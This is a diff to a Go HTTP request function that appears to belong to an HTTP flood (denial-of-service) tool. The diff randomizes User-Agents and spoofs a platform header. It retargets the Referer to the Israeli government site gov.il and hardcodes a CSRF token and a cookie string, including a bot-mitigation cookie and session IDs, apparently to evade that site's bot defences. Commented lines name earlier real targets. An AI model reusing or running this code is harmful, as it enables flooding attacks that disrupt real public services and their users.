@@ -239,16 +239,17 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 			return
 		}
 
-		// q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
-		q.Header.Set("User-Agent", "TMTaxiCaller/12.0.0-202110071112 (Xiaomi Redmi 8; Android 10; Scale/2.00)")
+		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
+		// q.Header.Set("User-Agent", "TMTaxiCaller/12.0.0-202110071112 (Xiaomi Redmi 8; Android 10; Scale/2.00)")
 		q.Header.Set("Cache-Control", "no-cache")
+		q.Header.Set("sec-ch-ua-platform", "Windows")
 		q.Header.Set("Accept-Charset", acceptCharset)
 		// q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
 		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
 		// q.Header.Set("Host", "relay.platform.taximaster.ru:8089")
 		q.Header.Set("Host", host)
-		q.Header.Set("Referer", "https://student.adu.uz/education/subjects")
+		q.Header.Set("Referer", "https://www.gov.il/en")
 		q.Header.Set("X-CSRF-Token", "AcmBF5hUlWhQvqKc5mEl0j9R_n9hBj5sMdjZRTSfgk9L_s1H3xKjH2nzy_rWD3eNDRqsPldwRD51l7RwWK7sew==")
 		q.Header.Set("Cookie", `BotMitigationCookie_11187792102695735350="997142001650098059fobk7QAlTIZfMlkGS1pHYq57868="; dtCookie=v_4_srv_-2D76_sn_6M5Q9TVOSDDCMD33PQUOOKMSB4DM2A12; rxVisitor=16500980611259I3B0UVMM7GJ9QS344TBTS72N2E8DMH3; U_Gov_ID=79146781-0b1c-404f-92fa-9b0c6a990e76; ASP.NET_SessionId=mk4kacfhlpm0feoeewkrbd35; _cls_s=292201ba-9d7d-42cd-9f6f-e1f1b376aa8b:0; _ga=GA1.1.1502292033.1650098064; _ga=GA1.1.1502292033.1650098064; _gid=GA1.1.1573730960.1650098104; dtSa=-; bbbbbceb668d=e5763216bbbbbceb668d_e5763216; dtLatC=322; _ga_HHWL5H88VE=GS1.1.1650098063.1.1.1650098525.0; rxvt=1650100325743|1650098061127; dtPC=-76$98520923_467h-vLJBAFHLOKFVPWCBSDQJBUQUPFLJFAMMT-0e0; dtCookie=v_4_srv_1_sn_6M5Q9TVOSDDCMD33PQUOOKMSB4DM2A12_perc_100000_ol_0_mul_1_app-3A4177d9cfa64243af_0_rcs-3Acss_0; p_hosting=!Sgo17wZRdB3cJkWDrBSzDWnAcZjD71wWpzuwKvvNGkVRVnI/Duxgb5Xpc/SHQ0tfTaxLQRJPVMdv5g==`)
 
